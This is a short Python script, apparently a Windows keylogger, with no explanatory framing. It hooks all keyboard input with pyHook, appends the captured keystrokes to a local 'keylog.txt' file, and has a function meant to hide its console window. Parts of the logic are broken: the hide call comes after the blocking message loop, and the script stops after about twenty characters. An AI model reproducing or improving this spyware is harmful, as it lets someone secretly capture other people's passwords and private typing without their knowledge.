import pyHook, pythoncom
import os
import sys

word = ''

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def keyPressed(event):
     global option,word
     if(len(word) > 20):
       f.write(word)
       f.close()
       word = ''
       exit(0)
     
     if event.Ascii == 13:
        keys = '<ENTER>'
     elif event.Ascii == 8:
        keys = '<BACK SPACE>'
     elif event.Ascii == 9:
        keys = '<TAB>'
     else:
        keys = chr(event.Ascii)
     word += keys
     print(word)
     
if __name__ == '__main__':
     f = open("keylog.txt","a")
     hookie = pyHook.HookManager() 
     hookie.KeyDown = keyPressed
     hookie.HookKeyboard()
     pythoncom.PumpMessages()
     hide()

